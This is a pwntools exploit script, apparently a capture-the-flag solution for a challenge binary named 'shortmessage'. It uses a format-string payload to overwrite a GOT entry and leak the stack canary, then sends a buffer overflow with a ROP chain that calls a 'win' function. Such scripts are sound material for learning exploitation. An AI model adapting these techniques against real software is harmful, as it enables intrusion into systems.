from pwn import *
import sys

context.binary = exe = ELF(f"./shortmessage_patched", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Silahkan kirim pesan anda: ", content)


x, p = init()
x.debug((
    # "break *main+83\nc\n"
    "break *main+126\nc\n"
))
# leak and change got
__stack_chk_fail = 0x404020
str_offset = 6
pay = fmtstr_payload(6, {__stack_chk_fail: exe.sym['main']}).replace(
    b"aaaab", f"%{str_offset+27}$p".encode()
)
x.send(pay)
# p.interactive()
if args.RMT:
    p.recvuntil(b"\xa0")
else:
    p.recvuntil(b"\xc0")
leak_canary = p.recvuntil(b"T")[:-4]
canary = eval(leak_canary)
log.info(f"{canary=:x}")


pay = cyclic(56)
pay += p64(canary)
pay += p64(0xdeadbeef)

r = ROP(exe)
# call win [rdi, rsi]
r.call(exe.sym['win'], [0xd34dc4f3, 0xf4c3c0d3])
pay += flat(r)
x.send(pay)

p.interactive()
